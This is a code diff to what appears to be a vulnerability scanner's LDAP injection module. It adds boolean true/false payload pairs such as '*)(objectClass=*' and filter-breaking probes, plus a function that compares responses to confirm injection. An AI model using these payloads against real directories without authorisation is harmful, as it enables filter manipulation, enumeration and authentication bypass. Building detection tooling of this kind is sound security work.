@@ -15,12 +15,28 @@ from __future__ import annotations
 
 import re
 
+import semantic_differential as sd
+
 
 def probes(orig: str) -> dict:
     """Filter-metacharacter breaks: an unbalanced parenthesis / stray operator makes the LDAP filter
     un-parseable, so a directory that concatenates input emits a filter/parse error."""
     o = orig or ""
     return {"paren": o + ")", "star_group": o + "*)(", "amp": o + "(", "pipe": o + "|("}
+
+
+def boolean_pairs(orig: str, token: str) -> list:
+    """LDAP filter truth/contradiction pairs for servers that suppress directory errors.
+
+    The grouped pair targets the common `(&(uid=INPUT)(objectClass=person))` shape: it adds a second
+    objectClass predicate that is universally true or deliberately impossible. The value pair covers the
+    simple `(cn=INPUT)` search-filter shape. In each pair only one assertion value changes.
+    """
+    missing = "apolaki-never-%s" % re.sub(r"[^a-zA-Z0-9_-]", "", token or "missing")
+    return [
+        {"name": "and_group", "true": "*)(objectClass=*", "false": "*)(objectClass=%s" % missing},
+        {"name": "value", "true": "*", "false": missing},
+    ]
 
 
 # Error signatures emitted by real LDAP stacks — present in a broken-filter response, absent from a normal
@@ -55,6 +71,15 @@ def evaluate(baseline_body: str, probe_body: str) -> dict:
         return {"confirmed": True, "oracle": "an LDAP directory error signature appeared after an unbalanced "
                 "filter break ('%s') — the input is concatenated into an LDAP search filter" % sig}
     return {"confirmed": False, "oracle": ""}
+
+
+def evaluate_boolean(true_body: str, false_body: str, true_payload: str, false_payload: str) -> dict:
+    ev = sd.evaluate(true_body, false_body, true_payload, false_payload)
+    if not ev["confirmed"]:
+        return {"confirmed": False, "oracle": ""}
+    return {"confirmed": True,
+            "oracle": ("an LDAP boolean differential changed only one filter assertion from universally true "
+                       "to an impossible value; %s" % ev["oracle"])}
 
 
 def finding(url: str, param: str, where: str, oracle: str) -> dict:
